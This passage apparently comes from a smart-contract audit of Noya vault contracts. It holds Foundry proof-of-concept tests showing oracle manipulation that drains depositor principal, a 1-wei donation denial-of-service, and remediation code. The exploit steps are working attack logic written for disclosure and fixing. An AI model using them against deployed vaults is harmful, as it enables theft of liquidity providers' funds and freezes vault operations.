    uint256 constant SEED = 1_000_000e6; // alice
    uint256 constant BOB_DEPOSIT = 100_000e6;
    uint256 constant CAROL_STACK = 100_000e6; // attacker deposit
    uint256 constant COLLATERAL = 100e18; // 100 WETH supplied as Morpho collateral

    function setUp() public {
        usdc = new MockToken("USDC", "USDC", 6);
        weth = new MockToken("WETH", "WETH", 18);
        usdcFeed = new MockFeed(int256(USDC_USD));
        wethFeed = new MockFeed(int256(WETH_USD));

        registry = new PositionRegistry(owner, owner, owner, address(0));
        noyaOracle = new NoyaValueOracle(registry);
        chainlinkOracle = new ChainlinkOracleConnector(address(registry));

        accountingManager = new AccountingManager(
            AccountingManagerConstructorParams(
                "PV", "PV", address(usdc), address(registry), address(noyaOracle), vaultId, owner, owner, owner, 0, 0, 0
            )
        );
        address[] memory watcherOwners = new address[](2);
        watcherOwners[0] = alice;
        watcherOwners[1] = bob;
        watchers = new Watchers(watcherOwners, 2);

        vm.startPrank(owner);
        registry.addVault(
            vaultId,
            address(accountingManager),
            address(usdc),
            owner,
            owner,
            owner,
            owner, // keeperContract -> the "manager"
            address(watchers),
            owner,
            new address[](0)
        );
        accountingManager.setDepositLimits(10e20, 10e20);
        vm.stopPrank();

        swapHandler = new SwapAndBridgeHandler(new address[](0), address(noyaOracle), registry, vaultId);

        morpho = new MorphoBlueMock(address(this));
        irm = new ZeroIrm();
        morpho.enableIrm(address(irm));
        morpho.enableLltv(LLTV);
        marketOracle = new ManipulableMorphoMarketOracle(HEALTHY_MARKET_PRICE);
        marketParams = MarketParams({
            loanToken: address(usdc),
            collateralToken: address(weth),
            oracle: address(marketOracle),
            irm: address(irm),
            lltv: LLTV
        });
        morpho.createMarket(marketParams);
        marketId = morpho.idOf(marketParams);

        connector = new MorphoBlueConnector(address(morpho), BaseConnectorCP(registry, vaultId, swapHandler, noyaOracle));

        vm.startPrank(owner);
        address[] memory connectors = new address[](1);
        connectors[0] = address(connector);
        bool[] memory enableds = new bool[](1);
        enableds[0] = true;
        registry.addConnector(vaultId, connectors, enableds);

        address[] memory amTokens = new address[](2);
        amTokens[0] = address(usdc);
        amTokens[1] = address(weth);
        registry.updateConnectorTrustedTokens(vaultId, address(accountingManager), amTokens, true);
        registry.updateConnectorTrustedTokens(vaultId, address(connector), amTokens, true);

        // canonical Noya valuation: chainlink feeds -> noyaOracle routes every pair through USD (840)
        address usd = address(840);
        address[] memory assets = new address[](2);
        address[] memory bases = new address[](2);
        address[] memory sources = new address[](2);
        assets[0] = address(usdc);
        bases[0] = usd;
        sources[0] = address(usdcFeed);
        assets[1] = address(weth);
        bases[1] = usd;
        sources[1] = address(wethFeed);
        chainlinkOracle.setAssetSources(assets, bases, sources);

        INoyaValueOracle[] memory oracleForUsd = new INoyaValueOracle[](1);
        oracleForUsd[0] = INoyaValueOracle(address(chainlinkOracle));
        address[] memory usdArr = new address[](1);
        usdArr[0] = usd;
        noyaOracle.updateDefaultPriceSource(usdArr, oracleForUsd);
        address[] memory route = new address[](1);
        route[0] = usd;
        noyaOracle.updatePriceRoute(address(weth), address(usdc), route);
        noyaOracle.updatePriceRoute(address(usdc), address(weth), route);

        registry.addTrustedPosition(vaultId, connector.MORPHO_POSITION_ID(), address(connector), true, false, abi.encode(marketId), "");
        registry.addTrustedPosition(vaultId, 0, address(accountingManager), false, false, abi.encode(address(usdc)), "");
        registry.addTrustedPosition(vaultId, 0, address(accountingManager), false, false, abi.encode(address(weth)), "");
        vm.stopPrank();
    }

    // ---------- helpers ----------

    function _depositThroughQueue(address user, uint256 amount) internal {
        usdc.mint(user, amount);
        vm.startPrank(user);
        usdc.approve(address(accountingManager), amount);
        accountingManager.deposit(user, amount, address(0));
        vm.stopPrank();
        vm.startPrank(owner);
        accountingManager.calculateDepositShares(10);
        vm.warp(block.timestamp + 31 minutes);
        accountingManager.executeDeposit(10, address(connector), "");
        vm.stopPrank();
    }

    function _supplyCollateralIntoMorpho() internal {
        weth.mint(address(connector), COLLATERAL);
        vm.prank(owner);
        connector.supply(COLLATERAL, marketId, false); // sOrC=false -> supplyCollateral
    }

    function _morphoPosition() internal view returns (HoldingPI memory p) {
        bytes32 posId = registry.calculatePositionId(address(connector), connector.MORPHO_POSITION_ID(), abi.encode(marketId));
        HoldingPI[] memory ps = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < ps.length; i++) {
            if (ps[i].positionId == posId) return ps[i];
        }
        revert("morpho holding position not found");
    }

    function _healthyState() internal {
        _depositThroughQueue(alice, SEED);
        _depositThroughQueue(bob, BOB_DEPOSIT);
        _supplyCollateralIntoMorpho();
    }

    function _canonicalCollateralValue() internal view returns (uint256) {
        return noyaOracle.getValue(address(weth), address(usdc), COLLATERAL);
    }

    function _erc4626PreviewRedeem(uint256 shares) internal view returns (uint256) {
        // replicates OZ convertToAssets (offset 0) used by previewRedeem
        return shares * (accountingManager.totalAssets() + 1) / (accountingManager.totalSupply() + 1);
    }

    function _queueDepositShares(address user) internal view returns (uint256 shares) {
        for (uint256 i = 0; i < 10; i++) {
            (DepositRequest[] memory d,) = accountingManager.getQueueItems(true, _arr(i));
            if (d[0].receiver == user && d[0].amount > 0) shares = d[0].shares;
        }
    }

    function _queueWithdrawAmount(address user) internal view returns (uint256 amt) {
        for (uint256 i = 0; i < 10; i++) {
            (, WithdrawRequest[] memory w) = accountingManager.getQueueItems(false, _arr(i));
            if (w[0].owner == user && w[0].shares > 0) amt = w[0].amount;
        }
    }

    function _arr(uint256 i) internal pure returns (uint256[] memory a) {
        a = new uint256[](1);
        a[0] = i;
    }

    // `restoreMarketOracle` = true models the divergence window closing: the lagging/stale
    // market feed catches back up to the canonical price between share-mint pricing
    // (calculateDepositShares) and redeem pricing (calculateWithdrawShares).
    function _runCarolRoundTrip(bool restoreMarketOracle) internal returns (uint256 carolShares, uint256 payout) {
        usdc.mint(carol, CAROL_STACK);
        vm.startPrank(carol);
        usdc.approve(address(accountingManager), CAROL_STACK);
        accountingManager.deposit(carol, CAROL_STACK, address(0));
        vm.stopPrank();

        vm.prank(owner);
        accountingManager.calculateDepositShares(10); // mint pricing: TVL understated
        carolShares = _queueDepositShares(carol);

        vm.startPrank(owner);
        vm.warp(block.timestamp + 31 minutes);
        accountingManager.executeDeposit(10, address(connector), "");
        vm.stopPrank();

        if (restoreMarketOracle) marketOracle.setPrice(HEALTHY_MARKET_PRICE);

        vm.startPrank(carol);
        accountingManager.withdraw(carolShares, carol);
        vm.stopPrank();

        vm.prank(owner);
        accountingManager.calculateWithdrawShares(10);
        payout = _queueWithdrawAmount(carol);

        vm.startPrank(owner);
        vm.warp(block.timestamp + 6 hours + 5 minutes);
        accountingManager.startCurrentWithdrawGroup();
        RetrieveData[] memory rd = new RetrieveData[](1);
        rd[0] = RetrieveData(payout, address(connector), abi.encode(payout, bytes("")));
        accountingManager.retrieveTokensForWithdraw(rd);
        accountingManager.fulfillCurrentWithdrawGroup();
        accountingManager.executeWithdraw(10);
        vm.stopPrank();
    }

    // ---------- R3 control: with a consistent market oracle nothing happens ----------

    function test_control_marketOracleMatchingNoya_noMispricing_noProfit() public {
        _healthyState();
        assertEq(accountingManager.TVL(), SEED + BOB_DEPOSIT + 300_000e6);
        assertEq(_canonicalCollateralValue(), 300_000e6);
        assertEq(connector.getPositionTVL(_morphoPosition(), address(usdc)), 300_000e6);

        uint256 aliceBefore = _erc4626PreviewRedeem(accountingManager.balanceOf(alice));
        (, uint256 payout) = _runCarolRoundTrip(false);

        // carol's round trip returns her deposit minus rounding dust: no value extracted
        assertLe(payout, CAROL_STACK + 10);
        uint256 aliceAfter = _erc4626PreviewRedeem(accountingManager.balanceOf(alice));
        assertGe(aliceAfter, aliceBefore - 10);
        // carol's CAROL_STACK entered the vault (executeDeposit) and then left (payout)
        assertApproxEqAbs(accountingManager.TVL(), SEED + BOB_DEPOSIT + 300_000e6 + CAROL_STACK - payout, 10);
    }

    // ---------- the finding: divergence -> misvalued TVL -> extractable value ----------

    function test_marketOracleDivergence_misvaluesTVL_and_letsAttackerExtractValue() public {
        _healthyState();

        // sanity: when the market oracle agrees with Noya's canonical oracle the TVL is exact
        assertEq(connector.getPositionTVL(_morphoPosition(), address(usdc)), 300_000e6);
        assertEq(accountingManager.TVL(), SEED + BOB_DEPOSIT + 300_000e6);
        uint256 aliceValueBefore = _erc4626PreviewRedeem(accountingManager.balanceOf(alice));

        // trigger: the market oracle goes stale/manipulated, Noya's canonical feed does not move
        marketOracle.setPrice(STALE_MARKET_PRICE);

        uint256 posTVL = connector.getPositionTVL(_morphoPosition(), address(usdc));
        uint256 canonical = _canonicalCollateralValue();
        // same 100 WETH: connector values it at $285k via the unvalidated market oracle,
        // Noya's canonical valueOracle says $300k -> exactly $15,000 understatement
        assertEq(posTVL, 285_000e6);
        assertEq(canonical, 300_000e6);
        assertEq(canonical - posTVL, 15_000e6);
        assertEq(accountingManager.TVL(), SEED + BOB_DEPOSIT + 285_000e6);

        // carol mints shares against the deflated TVL, the stale feed then catches back up,
        // and she redeems against the restored TVL
        (uint256 carolShares, uint256 payout) = _runCarolRoundTrip(true);
        uint256 fairShares = CAROL_STACK * (SEED + BOB_DEPOSIT) / (SEED + BOB_DEPOSIT + 300_000e6);
        assertGt(carolShares, fairShares); // more shares than the canonical price allows

        // carol exits with more base token than she put in: real, attributable loss to holders
        assertGt(payout, CAROL_STACK);
        assertGe(payout - CAROL_STACK, 1_000e6);
        assertEq(usdc.balanceOf(carol), payout);

        uint256 aliceValueAfter = _erc4626PreviewRedeem(accountingManager.balanceOf(alice));
        assertLt(aliceValueAfter, aliceValueBefore);
        assertGe(aliceValueBefore - aliceValueAfter, 900e6);

        // passive holder bob bleeds the same way: value of his shares at the canonical
        // equilibrium vs after carol's extraction
        uint256 bobValueBefore = BOB_DEPOSIT * (SEED + BOB_DEPOSIT + 300_000e6) / (SEED + BOB_DEPOSIT);
        uint256 bobValueAfter = _erc4626PreviewRedeem(accountingManager.balanceOf(bob));
        assertGe(bobValueBefore - bobValueAfter, 90e6);

        console.log("posTVL (market oracle):", posTVL);
        console.log("canonical collateral value:", canonical);
        console.log("TVL understatement:", 15_000e6);
        console.log("carol shares minted:", carolShares, "fair:", fairShares);
        console.log("carol payout:", payout, "profit:", payout - CAROL_STACK);
        console.log("alice value before:", aliceValueBefore, "after:", aliceValueAfter);
    }

    // ---------- the finding, part 2: reverting market oracle bricks vault accounting ----------

    function test_revertingMarketOracle_revertsTVL_and_blocksDepositsAndWithdrawals() public {
        _healthyState();

        usdc.mint(carol, CAROL_STACK);
        vm.startPrank(carol);
        usdc.approve(address(accountingManager), CAROL_STACK);
        accountingManager.deposit(carol, CAROL_STACK, address(0));
        vm.stopPrank();
        vm.prank(owner);
        accountingManager.calculateDepositShares(10);

        // bob queues a withdrawal request (queuing itself does not price anything)
        uint256 bobShares = accountingManager.balanceOf(bob);
        vm.prank(bob);
        accountingManager.withdraw(bobShares, bob);

        marketOracle.setBroken(true);

        vm.expectRevert();
        accountingManager.TVL();

        // deposit() evaluates TVL() -> reverts
        usdc.mint(carol, CAROL_STACK);
        vm.startPrank(carol);
        usdc.approve(address(accountingManager), CAROL_STACK);
        vm.expectRevert();
        accountingManager.deposit(carol, CAROL_STACK, address(0));
        vm.stopPrank();

        // withdraw pricing (previewRedeem -> TVL) is dead for the queued request
        vm.startPrank(owner);
        vm.expectRevert();
        accountingManager.calculateWithdrawShares(10);
        vm.stopPrank();

        // ERC4626 previews are equally bricked
        vm.expectRevert();
        accountingManager.previewDeposit(1000);
        vm.expectRevert();
        accountingManager.previewRedeem(1000);

        // permissionless entry point checkIfTVLHasDroped() evaluates getProfit() -> TVL() -> reverts for anyone
        vm.expectRevert();
        accountingManager.checkIfTVLHasDroped();

        // control: once the market oracle answers again, everything works
        marketOracle.setBroken(false);
        assertEq(accountingManager.TVL(), SEED + BOB_DEPOSIT + 300_000e6);
        usdc.mint(carol, CAROL_STACK);
        vm.startPrank(carol);
        usdc.approve(address(accountingManager), CAROL_STACK);
        accountingManager.deposit(carol, CAROL_STACK, address(0));
        vm.stopPrank();
        vm.prank(owner);
        accountingManager.calculateDepositShares(10); // prices carol's new deposit via TVL()
        vm.prank(owner);
        accountingManager.calculateWithdrawShares(10); // prices bob's queued withdrawal via TVL()
    }

    // =====================================================================
    // ESCALATION — same root defect (MorphoBlueConnector.convertCToL /
    // _getPositionTVL trusting IOracle(params.oracle).price()), strictly
    // more severe path than the base PoC.
    //
    // Base PoC: oracle understates -> mint cheap shares -> oracle must
    // RECOVER -> redeem; profit ~1% of the attacker's stack per shot.
    //
    // Escalation: pump the market oracle ABOVE Noya's canonical feed.
    // calculateWithdrawShares() prices a withdrawal via previewRedeem()
    // -> totalAssets() -> TVL() -> _getPositionTVL -> the market oracle,
    // i.e. against PHANTOM value, while executeWithdraw() pays out REAL
    // base token gathered from the connector (Watchers.verifyRemoveLiquidity
    // is a no-op, nothing sanity-checks the priced amount). Strictly more
    // severe because:
    //   - higher loss class: passive LPs' PRINCIPAL is paid out, up to
    //     (nearly) the vault's entire real USDC holdings, not a ~1% bleed;
    //   - weaker preconditions: single-sided manipulation window — the
    //     oracle never needs to "recover"; the vault reports HIGHER TVL
    //     (looks healthy and profitable) while it is drained, so nothing
    //     trips; price() is a raw unvalidated uint256, so the pump factor
    //     is attacker-chosen;
    //   - repeatability: each cycle re-opens against the same committed
    //     collateral and extracts again.
    // =====================================================================

    /// @dev carol deposits CAROL_STACK at HONEST prices, then (if `pump`)
    /// the market oracle is pumped before her withdrawal is priced. The
    /// keeper then runs its routine withdraw cycle. Returns carol's REAL
    /// USDC payout for the cycle. Only public entry points are used;
    /// owner is only pranked as the vault's own keeper/manager role.
    function _depositPumpWithdrawCycle(bool pump, uint256 pumpPrice) internal returns (uint256 payout) {
        uint256 carolBefore = usdc.balanceOf(carol);

        usdc.mint(carol, CAROL_STACK);
        vm.startPrank(carol);
        usdc.approve(address(accountingManager), CAROL_STACK);
        accountingManager.deposit(carol, CAROL_STACK, address(0));
        vm.stopPrank();

        vm.prank(owner);
        accountingManager.calculateDepositShares(10); // deposit priced at HONEST tvl

        vm.startPrank(owner);
        vm.warp(block.timestamp + 31 minutes);
        accountingManager.executeDeposit(10, address(connector), "");
        vm.stopPrank();

        if (pump) marketOracle.setPrice(pumpPrice); // manipulation window opens

        uint256 carolShares = accountingManager.balanceOf(carol);
        vm.startPrank(carol);
        accountingManager.withdraw(carolShares, carol); // permissionless
        vm.stopPrank();

        vm.prank(owner);
        accountingManager.calculateWithdrawShares(10); // withdrawal priced against PUMPED tvl

        payout = _queueWithdrawAmount(carol);

        vm.startPrank(owner); // routine keeper cycle
        vm.warp(block.timestamp + 6 hours + 5 minutes);
        accountingManager.startCurrentWithdrawGroup();
        RetrieveData[] memory rd = new RetrieveData[](1);
        rd[0] = RetrieveData(payout, address(connector), abi.encode(payout, bytes("")));
        accountingManager.retrieveTokensForWithdraw(rd); // pulls REAL usdc from the connector
        accountingManager.fulfillCurrentWithdrawGroup();
        accountingManager.executeWithdraw(10); // pays carol real usdc
        vm.stopPrank();

        if (pump) marketOracle.setPrice(HEALTHY_MARKET_PRICE); // window closes

        payout = usdc.balanceOf(carol) - carolBefore; // measured real payout
    }

    // R3 control for the escalated flow: identical cycle, no pump ->
    // withdrawal priced at the canonical tvl -> no profit, no LP loss.
    function test_escalated_control_noPump_sameCycle_paysFair_noLoss() public {
        _healthyState();
        uint256 aliceBefore = _erc4626PreviewRedeem(accountingManager.balanceOf(alice));
        uint256 vaultUSDCBefore = usdc.balanceOf(address(connector)) + usdc.balanceOf(address(accountingManager));

        uint256 payout = _depositPumpWithdrawCycle(false, HEALTHY_MARKET_PRICE);

        assertLe(payout, CAROL_STACK + 10); // round trip returns her deposit, nothing more
        uint256 aliceAfter = _erc4626PreviewRedeem(accountingManager.balanceOf(alice));
        assertGe(aliceAfter, aliceBefore - 10); // no LP value extracted
        uint256 vaultUSDCAfter = usdc.balanceOf(address(connector)) + usdc.balanceOf(address(accountingManager));
        assertGe(vaultUSDCAfter, vaultUSDCBefore - payout - 10); // vault keeps every remaining real usdc
    }

    // Escalated case 1: 10x pump of the market oracle. carol's withdrawal is
    // priced against phantom collateral value and paid in real USDC — and the
    // cycle REPEATS against the same committed collateral once the window
    // reopens, draining passive LP principal cycle after cycle.
    function test_escalated_pumpedOracle_pricesWithdrawAgainstPhantomTVL_repeatableDrain() public {
        _healthyState();

        // the mispricing enters ONLY through the defect surface: with the market
        // oracle pumped 10x, the connector values the same 100 WETH at $3M
        // while Noya's canonical valueOracle still says $300k
        marketOracle.setPrice(HEALTHY_MARKET_PRICE * 10);
        assertEq(_canonicalCollateralValue(), 300_000e6);
        assertEq(connector.getPositionTVL(_morphoPosition(), address(usdc)), 3_000_000e6);
        assertEq(accountingManager.TVL(), SEED + BOB_DEPOSIT + 3_000_000e6);
        marketOracle.setPrice(HEALTHY_MARKET_PRICE);

        uint256 aliceBefore = _erc4626PreviewRedeem(accountingManager.balanceOf(alice));
        uint256 bobBefore = _erc4626PreviewRedeem(accountingManager.balanceOf(bob));

        // round 1: deposit honest -> pump 10x -> withdraw -> keeper cycle
        uint256 p1 = _depositPumpWithdrawCycle(true, HEALTHY_MARKET_PRICE * 10);
        assertGt(p1, CAROL_STACK);
        assertGe(p1 - CAROL_STACK, 150_000e6); // >= $150k extracted in one cycle

        // round 2: identical, against the same committed collateral
        uint256 p2 = _depositPumpWithdrawCycle(true, HEALTHY_MARKET_PRICE * 10);
        assertGe(p2 - CAROL_STACK, 150_000e6);

        // measured, attributable principal loss for the passive LPs
        uint256 aliceAfter = _erc4626PreviewRedeem(accountingManager.balanceOf(alice));
        uint256 bobAfter = _erc4626PreviewRedeem(accountingManager.balanceOf(bob));
        assertGe(aliceBefore - aliceAfter, 300_000e6); // alice alone loses >= $300k of redeemable claim
        assertGe(bobBefore - bobAfter, 30_000e6); // bob pro rata
        assertGe(p1 + p2 - 2 * CAROL_STACK, 300_000e6); // carol's total take

        // the vault's real USDC reserves are the ones that left
        uint256 vaultUSDC = usdc.balanceOf(address(connector)) + usdc.balanceOf(address(accountingManager));
        assertLe(vaultUSDC, SEED + BOB_DEPOSIT + 2 * CAROL_STACK - (p1 + p2) + 10);

        console.log("cycle1 payout:", p1, "profit:", p1 - CAROL_STACK);
        console.log("cycle2 payout:", p2, "profit:", p2 - CAROL_STACK);
        console.log("carol total extracted:", p1 + p2 - 2 * CAROL_STACK);
        console.log("alice claim before:", aliceBefore, "after:", aliceAfter);
        console.log("vault real USDC left:", vaultUSDC);
    }
}
```

Honest bound on the escalated case: the per-cycle extraction is limited by the real USDC actually retrievable from the connector — a single oversized pump (58x was tried) prices a withdrawal above the real balance and `retrieveTokensForWithdraw` reverts, so a one-shot near-total drain was **not** demonstrated. What is demonstrated is the repeatable cycle: each 10x-pump cycle extracts roughly the phantom-value pro-rata share of real reserves (180,000.00 then 204,545.45 USDC), and the cycle can be re-run against the same committed collateral until the real base token is exhausted.

findings.remediation:
In `_getPositionTVL`, value the collateral directly using Noya's trusted `_getValue` (`valueOracle`) rather than routing through `convertCToL` and the external Morpho market oracle, or use `valueOracle.getValue` inside `convertCToL` to convert `collateral` to `loanToken` consistently across the connector:

```solidity
            tvl = _getValue(
                params.loanToken,
                base,
                supplyAmount - borrowAmount
            ) + _getValue(params.collateralToken, base, pos.collateral);
        }
    }

    function convertCToL(uint256 amount, address, address collateral, address loanToken) public view returns (uint256) {
        return _getValue(collateral, loanToken, amount);
    }
```

Additionally, as a bound on any residual pricing defect, withdrawal amounts priced by `calculateWithdrawShares` should be cross-checked against real retrievable assets before `retrieveTokensForWithdraw` gathers them — `Watchers.verifyRemoveLiquidity` (contracts/governance/Watchers.sol:8) is currently an empty function and validates nothing.

findings.technical_details:
In `BaseConnector.sol`, asset management functions—including `addLiquidity` (called by `AccountingManager.executeDeposit` and `BaseConnector.transferPositionToAnotherConnector`), `swapHoldings` (which routes through `SwapAndBridgeHandler.executeSwap`), `sendTokensToTrustedAddress`, and `updateTokenInRegistry`—invoke `_updateTokenInRegistry(address token)` after modifying token balances. This delegates to `_updateTokenInRegistry(address token, bool remove)` at lines 135–145:

```solidity
function _updateTokenInRegistry(address token, bool remove) internal {
    (address accountingManager,) = registry.getVaultAddresses(vaultId);
    bytes32 positionId = registry.calculatePositionId(accountingManager, 0, abi.encode(token));
    uint256 positionIndex =
        registry.getHoldingPositionIndex(vaultId, positionId, address(this), abi.encode(address(this)));
    if ((positionIndex == 0 && !remove) || (positionIndex > 0 && remove)) {
        emit UpdateTokenInRegistry(token, remove);
        registry.updateHoldingPosition(vaultId, positionId, abi.encode(address(this)), "", remove);
    }
}
```

This implementation creates a direct conflict with `PositionRegistry`'s trust and position management architecture:

1. **Connector-Specific Trusted Tokens Cannot Be Registered Under `accountingManager`**:
   `PositionRegistry` supports granting token trust to an individual connector via `updateConnectorTrustedTokens(vaultId, _connectorAddress, _tokens, true)` without trusting the token globally under `accountingManager`. `PositionRegistry.isTokenTrusted(vaultId, token, connector)` returns `true` if `token` is trusted for either `accountManager` or `connector`.
   However, to enable the `positionId` computed on line 138 (`calculatePositionId(accountingManager, 0, abi.encode(token))`), the maintainer must call `PositionRegistry.addTrustedPosition(vaultId, 0, accountingManager, false, false, abi.encode(token), "")`. Inside `addTrustedPosition` (lines 252–256 of `Registry.sol`), `isTokenTrusted(vaultId, token, calculatorConnector)` is called with `calculatorConnector = accountingManager`. Because `token` is not in `vaults[vaultId].connectors[accountingManager].trustedTokens`, `addTrustedPosition` reverts with `TokenNotTrusted(token)`.
   Even though `BaseConnector.getUnderlyingTokens(0, data)` (lines 232–236) explicitly supports `positionTypeId == 0` so a trusted position can be added with `calculatorConnector = address(connector)`, `_updateTokenInRegistry` ignores any connector-scoped `positionId` (`calculatePositionId(address(this), 0, abi.encode(token))`) and always looks up the `accountingManager`-scoped `positionId`.

2. **Unconditional `updateHoldingPosition` Reverts Asset Operations**:
   In `PositionRegistry.updateHoldingPosition` (lines 344 and 305 of `Registry.sol`), the registry enforces:
   ```solidity
   if (!vault.trustedPositionsBP[_positionId].isEnabled) revert InvalidPosition(_positionId);
   ```
   and, when adding a position (`index == 0`):
   ```solidity
   if (!isPositionTrustedForConnector(vaultId, _positionId, msg.sender)) {
       revert InvalidPosition(_positionId);
   }
   ```
   Whenever a connector holds a non-zero balance of a token after `addLiquidity`, `swapHoldings`, or `sendTokensToTrustedAddress` (including partial swaps/transfers, protocol dust, or 1 wei of the token transferred directly to the connector) and `calculatePositionId(accountingManager, 0, abi.encode(token))` is not enabled in `trustedPositionsBP` (or has `onlyOwner == true`), line 144 reverts the entire transaction with `InvalidPosition(positionId)`.

findings.remediation:
Update `BaseConnector._updateTokenInRegistry` to check whether the `accountingManager` holding position is trusted before falling back to a connector-scoped holding position ID, and ensure the connector is authorized to hold the token/position before invoking `registry.updateHoldingPosition`:

```solidity
    // @dev the following functions are used to manage holding tokens in the registry
    function _updateTokenInRegistry(address token, bool remove) internal {
        if (!remove && !registry.isTokenTrusted(vaultId, token, address(this))) {
            revert IConnector_UntrustedToken(token);
        }
        (address accountingManager,) = registry.getVaultAddresses(vaultId);
        // the value function is inside the accounting manager contract (so we can use the accounting manager address as the calculator connector)
        bytes32 positionId = registry.calculatePositionId(accountingManager, 0, abi.encode(token));
        if (!registry.isPositionTrustedForConnector(vaultId, positionId, address(this))) {
            positionId = registry.calculatePositionId(address(this), 0, abi.encode(token));
        }
        // if the token is not in the registry, we add it or remove it if the remove flag is true
        uint256 positionIndex =
            registry.getHoldingPositionIndex(vaultId, positionId, address(this), abi.encode(address(this)));
        if ((positionIndex == 0 && !remove) || (positionIndex > 0 && remove)) {
            if (registry.isPositionTrusted(vaultId, positionId)) {
                emit UpdateTokenInRegistry(token, remove);
                registry.updateHoldingPosition(vaultId, positionId, abi.encode(address(this)), "", remove);
            }
        }
    }
```

findings.technical_details:
In `contracts/helpers/BaseConnector.sol`, connectors track their held ERC20 tokens as holding positions in `PositionRegistry`. Whenever tokens are transferred out (`sendTokensToTrustedAddress`), added (`addLiquidity`), swapped (`swapHoldings`), or manually synchronized (`updateTokenInRegistry`), the connector invokes `_updateTokenInRegistry(address token)` at lines 158–160:

```solidity
function updateTokenInRegistry(address token) public onlyManager {
    _updateTokenInRegistry(token);
}

function _updateTokenInRegistry(address token) internal {
    _updateTokenInRegistry(token, IERC20(token).balanceOf(address(this)) == 0);
}
```

This delegates to `_updateTokenInRegistry(address token, bool remove)` (lines 135–146), which queries `registry.getHoldingPositionIndex(vaultId, positionId, address(this), abi.encode(address(this)))` and calls `registry.updateHoldingPosition(vaultId, positionId, abi.encode(address(this)), "", remove)` only when `(positionIndex == 0 && !remove) || (positionIndex > 0 && remove)`.

Relying on `IERC20(token).balanceOf(address(this)) == 0` creates a liveness and denial-of-service vulnerability:

1. **Prevention of Position Cleanup via 1-Wei Donation or Residual Dust:** When a manager or connector attempts to completely exit a token position (via `swapHoldings`, `sendTokensToTrustedAddress`, or `updateTokenInRegistry`), an attacker can front-run the transaction and transfer `1 wei` of `token` directly to the connector (`IERC20(token).transfer(connector, 1)`). Likewise, swaps or external protocol withdrawals can leave a tiny residual dust balance that is below minimum swap/withdrawal thresholds. Because `IERC20(token).balanceOf(address(this)) == 0` evaluates to `false`, `remove` is set to `false` and the holding position remains registered in `vault.holdingPositions`.
2. **Forced Registration of Unused Trusted Tokens:** If an attacker transfers `1 wei` of a token `tokenIn` to a connector before a call that triggers `_updateTokenInRegistry(tokenIn)` (or if the connector completely swaps `tokenIn` for `tokenOut` in `swapHoldings`), `tokenIn` is retained (or registered) as an active holding position despite holding only 1 wei.
3. **Bounded Position Capacity Exhaustion (`TooManyPositions`):** In `PositionRegistry.updateHoldingPosition` (line 308), adding a new holding position reverts with `TooManyPositions()` once `vault.holdingPositions.length >= maxNumHoldingPositions` (20 by default, capped at `MAX_NUM_HOLDING_POSITIONS = 40`). By preventing token holding positions from being removed across a vault's connectors, `vault.holdingPositions` fills up to `maxNumHoldingPositions`. Any subsequent operation that opens a new token or protocol position in the vault will revert with `TooManyPositions()`.
4. **Blocking `removeTrustedPosition`:** In `PositionRegistry.removeTrustedPosition` (lines 274–278), the registry iterates through `vault.holdingPositions` and reverts with `CannotRemovePosition(vaultId, _positionId)` if any holding position references `_positionId`. Because the manager cannot force-remove a dust token position via `updateTokenInRegistry`, the vault maintainer is blocked from removing the trusted position from the registry.

findings.remediation:
Introduce a configurable dust threshold (e.g., evaluated in base token value via `valueOracle` or per-token dust level) in `_updateTokenInRegistry(address token)` so negligible balances are treated as empty, or allow the vault manager to explicitly specify or force removal of dust positions when calling `updateTokenInRegistry`.

```solidity
    uint256 public dustLevel;

    function setDustLevel(uint256 _dustLevel) external onlyGovernance {
        dustLevel = _dustLevel;
    }

    function updateTokenInRegistry(address token, bool remove) public onlyManager {
        _updateTokenInRegistry(token, remove);
    }

    function updateTokenInRegistry(address token) public onlyManager {
        _updateTokenInRegistry(token);
    }

    /// @notice adds or removes the token position to the registry based on the balance of the token
    function _updateTokenInRegistry(address token) internal {
        uint256 balance = IERC20(token).balanceOf(address(this));
        (, address baseToken) = registry.getVaultAddresses(vaultId);
        uint256 balanceInBase = balance == 0 ? 0 : _getValue(token, baseToken, balance);
        _updateTokenInRegistry(token, balanceInBase <= dustLevel);
    }
```

Update line 353 in `PositionRegistry.updateHoldingPosition` to use `ownerConnector` instead of `calculatorConnector` when computing the `isPositionUsed` key for the relocated position:

```solidity
        if (removePosition) {
            if (positionIndex < vault.holdingPositions.length - 1) {
                vault.holdingPositions[positionIndex] = vault.holdingPositions[vault.holdingPositions.length - 1];
                vault.isPositionUsed[keccak256(
                    abi.encode(
                        vault.holdingPositions[positionIndex].ownerConnector,
                        vault.holdingPositions[positionIndex].positionId,
                        vault.holdingPositions[positionIndex].data
                    )
                )] = positionIndex;
            }
            vault.holdingPositions.pop();
```

findings.technical_details:
In `PendleConnector`, each Pendle market position is identified in `PositionRegistry` by a `positionId` computed as:
```solidity
bytes32 positionId = registry.calculatePositionId(address(this), PENDLE_POSITION_ID, abi.encode(market));
```
When `PositionRegistry.updateHoldingPosition` is called with `removePosition = false`, it performs two critical functions:
1. **Authorization check**: It verifies that the position is enabled in the vault's `trustedPositionsBP` mapping (`if (!vault.trustedPositionsBP[_positionId].isEnabled) revert InvalidPosition(_positionId);`).
2. **Accounting registration**: It records the `holdingPositionId` in `vault.holdingPositions` so that `AccountingManager.TVL()` queries `PendleConnector._getPositionTVL` for that `market`.

In `PendleConnector.depositIntoMarket` (lines 112–118):
```solidity
function depositIntoMarket(IPMarket market, uint256 SYamount, uint256 PTamount) external onlyManager nonReentrant {
    (IPStandardizedYield _SY, IPPrincipalToken _PT,) = IPMarket(market).readTokens();
    IERC20(address(_SY)).safeTransfer(address(market), SYamount);
    IERC20(address(_PT)).safeTransfer(address(market), PTamount);
    market.mint(address(this), SYamount, PTamount);
    market.skim();
    emit DepositIntoMarket(address(market), SYamount, PTamount);
}
```
Unlike `PendleConnector.supply` and `PendleConnector.decreasePosition`, `depositIntoMarket` never calls `registry.updateHoldingPosition`.

This omission breaks both position authorization and TVL accounting:
